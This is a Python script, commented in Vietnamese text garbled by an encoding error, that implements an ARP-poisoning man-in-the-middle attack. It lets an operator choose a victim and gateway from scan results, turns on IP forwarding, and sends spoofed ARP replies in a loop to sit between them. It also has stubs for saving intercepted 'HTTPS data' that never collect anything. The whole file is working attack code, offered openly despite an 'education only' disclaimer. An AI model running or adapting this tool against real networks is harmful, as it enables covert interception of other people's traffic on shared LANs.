#!/usr/bin/env python3
"""
Man-in-the-Middle (MitM) Attack Module - Phi√™n b·∫£n t·ªëi ∆∞u h√≥a
Th·ª±c hi·ªán t·∫•n c√¥ng ARP Poisoning ƒë·ªÉ xen v√†o gi·ªØa hai thi·∫øt b·ªã.
*** C·∫¢NH B√ÅO: CH·ªà S·ª¨ D·ª§NG CHO M·ª§C ƒê√çCH GI√ÅO D·ª§C V√Ä NGHI√äN C·ª®U. ***
"""

import threading
import time
import os
import socket
import logging
import netifaces
import json
import ssl
import struct
import re
from typing import Optional, Tuple, Dict, List
from scapy.all import Ether, ARP, srp, sendp, sniff, IP, TCP, UDP, Raw
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

def get_local_ip(interface: str) -> Optional[str]:
    """L·∫•y ƒë·ªãa ch·ªâ IP c·ªßa m√°y ƒëang ch·∫°y script tr√™n interface ƒë∆∞·ª£c ch·ªâ ƒë·ªãnh."""
    try:
        # S·ª≠ d·ª•ng netifaces ƒë·ªÉ l·∫•y IP local
        addrs = netifaces.ifaddresses(interface)
        if netifaces.AF_INET in addrs:
            return addrs[netifaces.AF_INET][0]['addr']
    except Exception:
        pass
    
    # Fallback: s·ª≠ d·ª•ng socket
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except Exception:
        return None

def get_mac(ip: str, interface: str, retries: int = 3, timeout: int = 2) -> Optional[str]:
    """
    L·∫•y ƒë·ªãa ch·ªâ MAC c·ªßa m·ªôt IP trong m·∫°ng LAN v·ªõi c∆° ch·∫ø retry.
    
    :param ip: ƒê·ªãa ch·ªâ IP m·ª•c ti√™u
    :param interface: Interface m·∫°ng
    :param retries: S·ªë l·∫ßn th·ª≠ l·∫°i
    :param timeout: Th·ªùi gian ch·ªù cho m·ªói l·∫ßn th·ª≠ (gi√¢y)
    :return: ƒê·ªãa ch·ªâ MAC ho·∫∑c None
    """
    for i in range(retries):
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), 
                        timeout=timeout, iface=interface, verbose=0)
            if ans:
                return ans[0][1].hwsrc
            logging.warning(f"Kh√¥ng nh·∫≠n ƒë∆∞·ª£c ph·∫£n h·ªìi ARP t·ª´ {ip} (l·∫ßn th·ª≠ {i+1}/{retries})")
        except Exception as e:
            logging.error(f"L·ªói khi l·∫•y MAC c·ªßa {ip} (l·∫ßn th·ª≠ {i+1}/{retries}): {e}")
        
        if i < retries - 1:
            time.sleep(1) # Ch·ªù 1 gi√¢y tr∆∞·ªõc khi th·ª≠ l·∫°i
            
    return None

def get_network_info(interface: str) -> Dict:
    """L·∫•y th√¥ng tin m·∫°ng c·ªßa interface."""
    try:
        addrs = netifaces.ifaddresses(interface)
        if netifaces.AF_INET in addrs:
            ip_info = addrs[netifaces.AF_INET][0]
            return {
                'ip': ip_info['addr'],
                'netmask': ip_info['netmask'],
                'broadcast': ip_info.get('broadcast', '')
            }
    except Exception as e:
        logging.error(f"L·ªói khi l·∫•y th√¥ng tin m·∫°ng: {e}")
    return {}

class MitmAttacker:
    """
    L·ªõp th·ª±c hi·ªán t·∫•n c√¥ng Man-in-the-Middle (MitM) t·ªëi ∆∞u h√≥a.
    """
    
    def __init__(self, interface: str, victim_ip: str, gateway_ip: str,
                 enable_sniffing: bool = True, poison_interval: int = 2):
        """
        Kh·ªüi t·∫°o MitM attacker.
        
        :param interface: T√™n interface m·∫°ng
        :param victim_ip: IP c·ªßa n·∫°n nh√¢n
        :param gateway_ip: IP c·ªßa gateway (router)
        :param enable_sniffing: B·∫≠t packet sniffing
        :param poison_interval: Kho·∫£ng th·ªùi gian g·ª≠i ARP poison (gi√¢y)
        """
        self.interface = interface
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip
        self.poison_interval = poison_interval
        self.enable_sniffing = enable_sniffing
        
        self.attacker_ip = get_local_ip(interface)
        if not self.attacker_ip:
            raise ValueError(f"Kh√¥ng th·ªÉ l·∫•y IP local tr√™n interface {interface}")
        
        # C∆° ch·∫ø ƒëi·ªÅu khi·ªÉn
        self.stop_event = threading.Event()
        self.threads = []
        
        # Initialize missing attributes
        self.ssl_sessions = {}
        self.https_data = []
        
        self.stats = {
            'arp_packets_sent': 0,
            'packets_intercepted': 0,
            'ssl_handshakes': 0,
            'http_requests': 0,
            'dns_queries': 0,
            'start_time': None,
        }
        self.stats_lock = threading.Lock()
        
        # MAC addresses
        self.victim_mac = None
        self.gateway_mac = None
        
        # IP forwarding state
        self.original_ip_forward = self._get_ip_forward_state()
        
        # Logging
        self._setup_logging()
        
    def _setup_logging(self):
        """Thi·∫øt l·∫≠p logging."""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('mitm_attack.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
        
    def _load_device_database(self) -> Dict:
        """T·∫£i c∆° s·ªü d·ªØ li·ªáu thi·∫øt b·ªã t·ª´ file YAML ho·∫∑c JSON."""
        devices = {}
        try:
            yaml_file = 'devices.yaml'
            if os.path.exists(yaml_file):
                import yaml
                with open(yaml_file, 'r', encoding='utf-8') as f:
                    data = yaml.safe_load(f)
                    if data and 'devices' in data:
                        return data.get('devices', {})
                    return data if isinstance(data, dict) else {}
            
            json_file = 'devices.txt'
            if os.path.exists(json_file):
                with open(json_file, 'r') as f:
                    return json.load(f)
        except Exception as e:
            self.logger.warning(f"Kh√¥ng th·ªÉ t·∫£i DB thi·∫øt b·ªã, s·∫Ω d·ª±a v√†o ARP requests: {e}")
        return devices

    def load_targets_from_scan(self, exclude_router: bool = True, exclude_attacker: bool = True) -> List[str]:
        """
        T·∫£i danh s√°ch m·ª•c ti√™u t·ª´ k·∫øt qu·∫£ qu√©t m·∫°ng.
        
        :param exclude_router: Lo·∫°i tr·ª´ IP router (th∆∞·ªùng l√† .1)
        :param exclude_attacker: Lo·∫°i tr·ª´ IP c·ªßa attacker
        :return: Danh s√°ch IP m·ª•c ti√™u
        """
        targets = []
        
        try:
            # Th·ª≠ ƒë·ªçc file YAML tr∆∞·ªõc
            yaml_file = 'devices.yaml'
            if os.path.exists(yaml_file):
                import yaml
                with open(yaml_file, 'r', encoding='utf-8') as f:
                    data = yaml.safe_load(f)
                    if data and 'devices' in data:
                        devices = data['devices']
                    else:
                        devices = data  # Fallback n·∫øu kh√¥ng c√≥ c·∫•u tr√∫c metadata
            else:
                # Fallback v·ªÅ JSON
                json_file = 'devices.txt'
                if os.path.exists(json_file):
                    with open(json_file, 'r') as f:
                        devices = json.load(f)
                else:
                    self.logger.warning("Kh√¥ng t√¨m th·∫•y file devices.yaml ho·∫∑c devices.txt. Vui l√≤ng qu√©t m·∫°ng tr∆∞·ªõc.")
                    return targets
            
            for ip, info in devices.items():
                if info.get('status') == 'up':
                    # Lo·∫°i tr·ª´ router (th∆∞·ªùng l√† .1)
                    if exclude_router and ip.endswith('.1'):
                        self.logger.info(f"Lo·∫°i tr·ª´ router: {ip}")
                        continue
                        
                    # Lo·∫°i tr·ª´ attacker
                    if exclude_attacker and ip == self.attacker_ip:
                        self.logger.info(f"Lo·∫°i tr·ª´ attacker: {ip}")
                        continue
                        
                    targets.append(ip)
                    
            self.logger.info(f"ƒê√£ t·∫£i {len(targets)} m·ª•c ti√™u t·ª´ devices.yaml")
                
        except Exception as e:
            self.logger.error(f"L·ªói khi t·∫£i targets: {e}")
            
        return targets
    
    def _select_target_from_menu(self, available_targets: List[str], prompt: str) -> Optional[str]:
        """
        Hi·ªÉn th·ªã menu ch·ªçn 1 m·ª•c ti√™u c·ª• th·ªÉ.
        
        :param available_targets: Danh s√°ch c√°c m·ª•c ti√™u c√≥ s·∫µn
        :param prompt: Ti√™u ƒë·ªÅ cho menu
        :return: IP c·ªßa m·ª•c ti√™u ƒë∆∞·ª£c ch·ªçn
        """
        print(f"\n=== {prompt.upper()} ===")
        devices_info = {}
        try:
            # Th·ª≠ ƒë·ªçc YAML tr∆∞·ªõc
            yaml_file = 'devices.yaml'
            if os.path.exists(yaml_file):
                import yaml
                with open(yaml_file, 'r', encoding='utf-8') as f:
                    data = yaml.safe_load(f)
                    if data and 'devices' in data:
                        devices_info = data['devices']
                    else:
                        devices_info = data
            else:
                # Fallback v·ªÅ JSON
                json_file = 'devices.txt'
                if os.path.exists(json_file):
                    with open(json_file, 'r') as f:
                        devices_info = json.load(f)
        except:
            pass
            
        for i, ip in enumerate(available_targets, 1):
            device_info = devices_info.get(ip, {})
            hostname = device_info.get('hostname', 'Unknown')
            vendor = device_info.get('mac_vendor', device_info.get('vendor', 'Unknown'))
            os_info = device_info.get('os', 'Unknown')
            device_type = device_info.get('device_type', 'Unknown')
            risk_level = device_info.get('security_info', {}).get('risk_level', 'low')
            
            # Hi·ªÉn th·ªã th√¥ng tin chi ti·∫øt h∆°n
            print(f"{i}. {ip} - {hostname}")
            print(f"   üì± {vendor} | {os_info} | {device_type.title()} | Risk: {risk_level.upper()}")
        
        while True:
            try:
                choice = input("\nCh·ªçn m·ª•c ti√™u (1-{}): ".format(len(available_targets)))
                choice = int(choice)
                
                if 1 <= choice <= len(available_targets):
                    selected_ip = available_targets[choice - 1]
                    self.logger.info(f"ƒê√£ ch·ªçn m·ª•c ti√™u: {selected_ip}")
                    return selected_ip
                else:
                    print("L·ª±a ch·ªçn kh√¥ng h·ª£p l·ªá. Vui l√≤ng th·ª≠ l·∫°i.")
            except ValueError:
                print("Vui l√≤ng nh·∫≠p s·ªë.")
        
    def _get_ip_forward_state(self) -> str:
        """Ki·ªÉm tra tr·∫°ng th√°i IP forwarding hi·ªán t·∫°i."""
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
                return f.read().strip()
        except Exception:
            return "0"

    def _set_ip_forward(self, state: str) -> bool:
        """B·∫≠t ho·∫∑c t·∫Øt IP forwarding."""
        if os.geteuid() != 0:
            self.logger.warning("C·∫ßn quy·ªÅn root ƒë·ªÉ thay ƒë·ªïi IP forwarding.")
            return False
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write(state)
            self.logger.info(f"IP forwarding ƒë√£ ƒë∆∞·ª£c ƒë·∫∑t th√†nh: {state}")
            return True
        except Exception as e:
            self.logger.error(f"L·ªói khi thay ƒë·ªïi IP forwarding: {e}")
            return False

    def _resolve_targets(self) -> bool:
        """Ph√¢n gi·∫£i MAC c·ªßa c·∫£ hai m·ª•c ti√™u, ∆∞u ti√™n t·ª´ DB."""
        self.logger.info(f"ƒêang ph√¢n gi·∫£i MAC c·ªßa {self.victim_ip} (victim) v√† {self.gateway_ip} (gateway)...")
        
        device_db = self._load_device_database()

        # Resolve victim MAC
        victim_info = device_db.get(self.victim_ip)
        if victim_info and victim_info.get('mac_address'):
            self.victim_mac = victim_info['mac_address']
            self.logger.info(f"T√¨m th·∫•y MAC c·ªßa victim trong DB: {self.victim_mac}")
        else:
            self.logger.info(f"Kh√¥ng t√¨m th·∫•y MAC c·ªßa victim trong DB, ƒëang g·ª≠i ARP request...")
            self.victim_mac = get_mac(self.victim_ip, self.interface)

        if not self.victim_mac:
            self.logger.error(f"Kh√¥ng t√¨m th·∫•y MAC c·ªßa victim {self.victim_ip}")
            return False
        self.logger.info(f"MAC c·ªßa victim {self.victim_ip}: {self.victim_mac}")

        # Resolve gateway MAC
        gateway_info = device_db.get(self.gateway_ip)
        if gateway_info and gateway_info.get('mac_address'):
            self.gateway_mac = gateway_info['mac_address']
            self.logger.info(f"T√¨m th·∫•y MAC c·ªßa gateway trong DB: {self.gateway_mac}")
        else:
            self.logger.info(f"Kh√¥ng t√¨m th·∫•y MAC c·ªßa gateway trong DB, ƒëang g·ª≠i ARP request...")
            self.gateway_mac = get_mac(self.gateway_ip, self.interface)

        if not self.gateway_mac:
            self.logger.error(f"Kh√¥ng t√¨m th·∫•y MAC c·ªßa gateway {self.gateway_ip}")
            return False
        self.logger.info(f"MAC c·ªßa gateway {self.gateway_ip}: {self.gateway_mac}")
        
        return True

    def _poison_loop(self):
        """V√≤ng l·∫∑p g·ª≠i c√°c g√≥i tin ARP gi·∫£ m·∫°o."""
        # L·ª´a victim: n√≥i r·∫±ng IP c·ªßa gateway c√≥ MAC c·ªßa attacker
        packet_to_victim = ARP(op=2, pdst=self.victim_ip, psrc=self.gateway_ip, hwdst=self.victim_mac)
        # L·ª´a gateway: n√≥i r·∫±ng IP c·ªßa victim c√≥ MAC c·ªßa attacker
        packet_to_gateway = ARP(op=2, pdst=self.gateway_ip, psrc=self.victim_ip, hwdst=self.gateway_mac)
        
        self.logger.info("B·∫Øt ƒë·∫ßu v√≤ng l·∫∑p ARP poisoning...")
        
        while not self.stop_event.is_set():
            try:
                sendp(packet_to_victim, iface=self.interface, verbose=0)
                sendp(packet_to_gateway, iface=self.interface, verbose=0)
                
                with self.stats_lock:
                    self.stats['arp_packets_sent'] += 2
                    
                time.sleep(self.poison_interval)
                
            except Exception as e:
                self.logger.error(f"L·ªói trong v√≤ng l·∫∑p ARP poison: {e}")
                break
                
        self.logger.info("ƒê√£ d·ª´ng v√≤ng l·∫∑p ARP poisoning.")

    def _monitor_attack(self):
        """Gi√°m s√°t v√† hi·ªÉn th·ªã th·ªëng k√™ t·∫•n c√¥ng."""
        while not self.stop_event.is_set():
            time.sleep(10)  # Hi·ªÉn th·ªã th·ªëng k√™ m·ªói 10 gi√¢y
            
            with self.stats_lock:
                elapsed = time.time() - self.stats['start_time'] if self.stats['start_time'] else 0
                
                self.logger.info(
                    f"üìä Th·ªëng k√™ MitM: {self.stats['packets_intercepted']} g√≥i tin, "
                    f"{self.stats['arp_packets_sent']} ARP packets, "
                    f"{self.stats['ssl_handshakes']} SSL handshakes, "
                    f"{self.stats['http_requests']} HTTP requests, "
                    f"{self.stats['dns_queries']} DNS queries"
                )
                
                # Hi·ªÉn th·ªã SSL sessions
                if self.ssl_sessions:
                    self.logger.info(f"üîí SSL Sessions: {len(self.ssl_sessions)} active")
                    for session_key, session_info in list(self.ssl_sessions.items())[:3]:  # Hi·ªÉn th·ªã 3 session ƒë·∫ßu
                        self.logger.info(f"   {session_info['client']} -> {session_info['server']}")

    def _restore_arp(self):
        """Kh√¥i ph·ª•c l·∫°i b·∫£ng ARP c·ªßa c√°c m·ª•c ti√™u."""
        if not self.victim_mac or not self.gateway_mac:
            return
            
        self.logger.info("ƒêang kh√¥i ph·ª•c b·∫£ng ARP...")
        
        # G·ª≠i broadcast ƒë·ªÉ kh√¥i ph·ª•c ARP cho victim
        packet_to_victim = ARP(
            op=2, pdst=self.victim_ip, psrc=self.gateway_ip, 
            hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gateway_mac
        )
        # G·ª≠i broadcast ƒë·ªÉ kh√¥i ph·ª•c ARP cho gateway
        packet_to_gateway = ARP(
            op=2, pdst=self.gateway_ip, psrc=self.victim_ip, 
            hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.victim_mac
        )
        
        for _ in range(5):  # G·ª≠i 5 l·∫ßn ƒë·ªÉ ƒë·∫£m b·∫£o
            sendp([packet_to_victim, packet_to_gateway], iface=self.interface, verbose=0)
            time.sleep(0.5)
            
        self.logger.info("Kh√¥i ph·ª•c ARP ho√†n t·∫•t.")

    def start_attack(self) -> bool:
        """B·∫Øt ƒë·∫ßu cu·ªôc t·∫•n c√¥ng MitM."""
        self.logger.info(f"B·∫Øt ƒë·∫ßu t·∫•n c√¥ng MitM: {self.victim_ip} (Victim) <--> {self.gateway_ip} (Gateway)")
        
        # Hi·ªÉn th·ªã th√¥ng tin m·∫°ng
        network_info = get_network_info(self.interface)
        if network_info:
            self.logger.info(f"Interface {self.interface}: {network_info['ip']}/{network_info['netmask']}")
        
        # Ph√¢n gi·∫£i MAC
        if not self._resolve_targets():
            return False
        
        # B·∫≠t IP forwarding
        if not self._set_ip_forward("1"):
            self.logger.warning("Kh√¥ng th·ªÉ b·∫≠t IP forwarding. T·∫•n c√¥ng c√≥ th·ªÉ l√†m gi√°n ƒëo·∫°n m·∫°ng.")
        
        self.stop_event.clear()
        self.stats['start_time'] = time.time()
        
        # Kh·ªüi ƒë·ªông c√°c threads
        threads_to_start = [
            (self._poison_loop, "ARP Poison"),
            (self._monitor_attack, "Monitor")
        ]
        
        for func, name in threads_to_start:
            thread = threading.Thread(target=func, daemon=True, name=name)
            self.threads.append(thread)
            thread.start()
            
        self.logger.info(f"T·∫•n c√¥ng ƒë√£ b·∫Øt ƒë·∫ßu v·ªõi {len(self.threads)} threads. Nh·∫•n Ctrl+C ƒë·ªÉ d·ª´ng.")
        return True

    def stop_attack(self):
        """D·ª´ng t·∫•n c√¥ng MitM v√† kh√¥i ph·ª•c ARP tables."""
        self.logger.info("üõë ƒêang d·ª´ng t·∫•n c√¥ng MitM...")
        self.stop_event.set()
        
        # D·ª´ng c√°c threads
        for thread in self.threads:
            thread.join(timeout=2)
        self.threads.clear()
        
        # Kh√¥i ph·ª•c ARP tables
        self._restore_arp()
        
        # Kh√¥i ph·ª•c IP forwarding
        self._set_ip_forward(self.original_ip_forward)

    def get_stats(self) -> Dict:
        """L·∫•y th·ªëng k√™ hi·ªán t·∫°i."""
        with self.stats_lock:
            return self.stats.copy()
    
    def is_attacking(self) -> bool:
        """Ki·ªÉm tra xem c√≥ ƒëang t·∫•n c√¥ng kh√¥ng."""
        return not self.stop_event.is_set()

    def save_https_data(self, filename: str = None):
        """L∆∞u d·ªØ li·ªáu HTTPS ƒë√£ thu th·∫≠p."""
        try:
            if filename is None:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"https_data_{timestamp}.json"
            
            data = {
                'timestamp': datetime.now().isoformat(),
                'victim_ip': self.victim_ip,
                'gateway_ip': self.gateway_ip,
                'ssl_sessions': self.ssl_sessions,
                'https_data': self.https_data,
                'stats': self.stats
            }
            
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, default=str)
                
            self.logger.info(f"üíæ ƒê√£ l∆∞u d·ªØ li·ªáu HTTPS v√†o: {filename}")
            
        except Exception as e:
            self.logger.error(f"L·ªói khi l∆∞u d·ªØ li·ªáu HTTPS: {e}")
    
    def get_https_summary(self) -> Dict:
        """L·∫•y t√≥m t·∫Øt d·ªØ li·ªáu HTTPS."""
        summary = {
            'total_ssl_sessions': len(self.ssl_sessions),
            'total_https_requests': self.stats['http_requests'],
            'total_dns_queries': self.stats['dns_queries'],
            'domains_visited': set(),
            'ssl_servers': set()
        }
        
        # Th·ªëng k√™ domains v√† servers
        for session_info in self.ssl_sessions.values():
            if 'server' in session_info:
                summary['ssl_servers'].add(session_info['server'])
                # Th√™m domain t·ª´ server name
                if '.' in session_info['server']:
                    summary['domains_visited'].add(session_info['server'])
        
        summary['domains_visited'] = list(summary['domains_visited'])
        summary['ssl_servers'] = list(summary['ssl_servers'])
        
        return summary

def run_mitm_attack(interface: str, **kwargs):
    """
    H√†m ti·ªán √≠ch ƒë·ªÉ ch·∫°y t·∫•n c√¥ng MitM v·ªõi menu l·ª±a ch·ªçn.
    
    :param interface: Interface m·∫°ng
    :param kwargs: C√°c tham s·ªë kh√°c cho MitmAttacker
    """
    try:
        print("\n=== MITM ATTACK MODULE ===")
        # Dummy attacker ƒë·ªÉ truy c·∫≠p c√°c h√†m ti·ªán √≠ch
        dummy_attacker = MitmAttacker(interface, "127.0.0.1", "127.0.0.1")
        
        # 1. T·∫£i danh s√°ch m·ª•c ti√™u
        all_targets = dummy_attacker.load_targets_from_scan(exclude_router=False, exclude_attacker=True)
        if not all_targets:
            print("[-] Kh√¥ng t√¨m th·∫•y thi·∫øt b·ªã n√†o. Vui l√≤ng ch·∫°y 'scan' tr∆∞·ªõc.")
            return

        # 2. Ch·ªçn n·∫°n nh√¢n (victim)
        victim_targets = [t for t in all_targets if not t.endswith('.1')]
        if not victim_targets:
            print("[-] Kh√¥ng c√≥ n·∫°n nh√¢n n√†o ph√π h·ª£p ƒë·ªÉ t·∫•n c√¥ng (ƒë√£ lo·∫°i tr·ª´ gateway).")
            return
        victim_ip = dummy_attacker._select_target_from_menu(victim_targets, "CH·ªåN N·∫†N NH√ÇN (VICTIM)")
        if not victim_ip:
            print("[-] ƒê√£ h·ªßy t·∫•n c√¥ng.")
            return

        # 3. Ch·ªçn gateway
        gateway_targets = [t for t in all_targets if t != victim_ip]
        gateway_ip = dummy_attacker._select_target_from_menu(gateway_targets, "CH·ªåN GATEWAY (ROUTER)")
        if not gateway_ip:
            print("[-] ƒê√£ h·ªßy t·∫•n c√¥ng.")
            return

        # 4. Kh·ªüi t·∫°o v√† b·∫Øt ƒë·∫ßu t·∫•n c√¥ng
        attacker = MitmAttacker(interface, victim_ip, gateway_ip, **kwargs)
        
        if attacker.start_attack():
            try:
                while attacker.is_attacking():
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n[*] Ng∆∞·ªùi d√πng y√™u c·∫ßu d·ª´ng...")
        
        attacker.stop_attack()

    except KeyboardInterrupt:
        print("\n[*] H·ªßy t·∫•n c√¥ng.")
    except Exception as e:
        logging.error(f"L·ªói kh√¥ng mong mu·ªën trong MitM: {e}")
